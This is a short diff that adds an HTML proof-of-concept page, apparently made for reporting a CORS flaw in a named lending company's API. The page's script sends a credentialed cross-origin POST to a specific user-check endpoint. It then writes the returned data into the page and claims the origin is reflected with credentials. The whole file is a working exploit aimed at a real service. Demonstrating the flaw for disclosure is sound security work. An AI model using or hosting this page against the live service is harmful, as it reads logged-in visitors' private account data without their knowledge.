@@ -1,0 +1,11 @@
+<!DOCTYPE html>
+<html>PoC Julo CORS - Naffin
+<script>
+fetch('https://api.julo.co.id/api/v1/check-user/', {
+  method: 'POST',
+  credentials: 'include',
+  headers: {'Content-Type':'application/json'},
+  body: JSON.stringify({})
+}).then(r=>r.text()).then(t=>{document.write('<pre>'+t.slice(0,500)+'</pre><br>CORS VULN: origin reflected with credentials');})
+</script>
+</html>
